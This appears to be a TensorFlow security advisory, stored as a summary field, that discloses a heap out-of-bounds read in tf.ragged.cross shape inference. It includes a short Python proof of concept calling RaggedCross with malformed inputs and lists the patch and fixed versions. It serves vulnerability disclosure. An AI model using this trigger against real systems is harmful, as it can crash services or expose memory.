summary: "Heap OOB read in `tf.ragged.cross`\n### Impact\nThe [shape inference code for `tf.ragged.cross`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/ragged_array_ops.cc#L64)\
  \ can trigger a read outside of bounds of heap allocated array:\n\n```python\nimport tensorflow\
  \ as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.RaggedCross(ragged_values=[],\n   \
  \                          ragged_row_splits=[],\n                             sparse_indices=[[5]],\n\
  \                             sparse_values=[],\n                             sparse_shape=[5],\n\
  \                             dense_inputs=[['a']],\n                             input_order='RD',\n\
  \                             hashed_output=False,\n                             num_buckets=5,\n\
  \                             hash_key=2,\n                             out_values_type=tf.string,\n\
  \                             out_row_splits_type=tf.int64)\n  return y\n\ntest()\n```\n\n\
  ### Patches\nWe have patched the issue in GitHub commit [fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8](https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8).\n\
  \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow\
  \ 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported\
  \ range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md)\
  \ for more information regarding the security model and how to contact us with issues and\
  \ questions.\n    \n### Attribution\nThis vulnerability has been reported by members of the\
  \ Aivul Team from Qihoo 360."
